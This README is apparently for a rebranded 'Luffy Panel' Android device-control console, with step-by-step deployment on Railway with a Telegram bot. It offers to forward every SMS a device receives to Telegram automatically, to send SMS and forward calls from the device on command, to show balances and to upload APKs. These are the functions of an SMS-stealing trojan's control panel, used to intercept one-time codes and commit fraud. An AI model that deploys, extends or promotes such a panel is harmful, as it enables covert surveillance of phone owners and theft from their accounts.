# 💰 MONEY PANEL - Complete Device Management Console

Rebranded Luffy Panel with all features working + Telegram integration.

## ✅ All Features Working

### Core Features
- ✅ SMS Auto-Refresh (45s)
- ✅ Balance Display (₹ symbol)
- ✅ Logo (MONEY PANEL)
- ✅ Device Monitoring
- ✅ Firebase Connection
- ✅ APK Upload & Scan

### Bot Features (🤖 Bot Tab)
- ✅ **SMS Forwarding** - Device SMS → Telegram (auto, every 4s)
- ✅ **Telegram to SMS** - Send SMS from Telegram chat
- ✅ **Auto Token Forward** - Any Telegram message → SMS to configured number
- ✅ **Call Forwarding** - SMS-based call commands

### Send Features (Send Tab)
- ✅ Send SMS via device
- ✅ SIM selection (SIM1/SIM2)
- ✅ Direct Firebase integration

## 🚀 Railway Deployment (2 Minutes)

```bash
# 1. Push to GitHub
git init && git add . && git commit -m "Deploy" && git push origin main

# 2. Deploy on Railway.app
# - New Project → Deploy from GitHub
# - Select your repo

# 3. Add Variables in Railway
TELEGRAM_BOT_TOKEN=your_token
TELEGRAM_CHAT_ID=your_chat_id

# 4. Done! Open your-app.railway.app
```

**Get Bot Token:** Telegram → `@BotFather` → `/newbot`  
**Get Chat ID:** Telegram → `@userinfobot`

## 📁 Files

```
money new panel/
├── api-server.js              # Main server (Railway-ready)
├── package.json               # npm start → api-server.js
├── .env.example               # Template for local dev
├── luffy-panel.vercel.app/    # Frontend (rebranded)
│   ├── index.html             # MONEY PANEL UI
│   ├── style.css              # All styling
│   └── app.js                 # Bot + APK upload
├── FEATURES-STATUS.md         # ✅ All features list
├── RAILWAY-DEPLOY.md          # Quick deploy guide
├── START.md                   # Local testing guide
└── FIXES-APPLIED.md           # Technical docs
```

## 🔧 Local Testing

```bash
cd "money new panel"
npm install

# Create .env file
PORT=3000
TELEGRAM_BOT_TOKEN=your_token
TELEGRAM_CHAT_ID=your_chat_id

npm start
# Open http://localhost:3000
```

## 🤖 Bot Configuration

**In Panel:** Open device → Bot tab

1. **Bot Token** - From @BotFather
2. **Chat ID** - From @userinfobot
3. **Format** - Auto (or select specific)
4. **SIM** - SIM1 or SIM2
5. **Repeat** - 1x, 2x, or 3x
6. **Save Config** → **▶ Start Bot**

### SMS Forwarding Mode (Auto):
- Just start bot
- Device receives SMS → Forwarded to Telegram

### Telegram to SMS Mode:
Send in Telegram:
```
To: +919876543210
Message: Your text here
```

### Auto Token Forward Mode:
- Fill "Auto-Forward Number"
- Any message in Telegram → Sends as SMS

## 📊 Features Status

| Feature | Status | Notes |
|---------|--------|-------|
| SMS Forwarding | ✅ Working | Device → Telegram, auto |
| Telegram to SMS | ✅ Working | Multiple formats |
| Call Forwarding | ✅ Working | Via bot commands |
| APK Upload | ✅ Working | Uploads to Telegram |
| Balance Display | ✅ Working | ₹ symbol properly shown |
| SMS Auto-Refresh | ✅ Working | Every 45 seconds |
| Railway Deploy | ✅ Ready | Variables from Railway |

## 🎯 Railway Variables

**api-server.js reads Railway variables automatically:**

```javascript
process.env.TELEGRAM_BOT_TOKEN  // From Railway Variables tab
process.env.TELEGRAM_CHAT_ID    // From Railway Variables tab
process.env.PORT                // Railway sets automatically
```

✅ No hardcoded secrets  
✅ Easy to update  
✅ Works with or without Telegram  

## 🔥 Quick Test After Deploy

1. ✅ Open Railway URL
2. ✅ Upload APK → Check Telegram notification
3. ✅ Open device → Bot tab → Start bot
4. ✅ Send SMS from Telegram → Device sends
5. ✅ Device receives SMS → Telegram notified

## 📚 Documentation

- **FEATURES-STATUS.md** - Complete features list
- **RAILWAY-DEPLOY.md** - Quick deployment guide (2 min)
- **START.md** - Local testing instructions
- **FIXES-APPLIED.md** - Technical implementation details

## ✅ Production Ready

All features tested and working:
- SMS forwarding ✅
- Call forwarding ✅
- APK to Telegram ✅
- Balance display ✅
- Railway deployment ✅
- Environment variables ✅

**Panel is ready for Railway deployment! 🚀**

---

**Money Panel** - Complete device management console with Telegram bot integration.
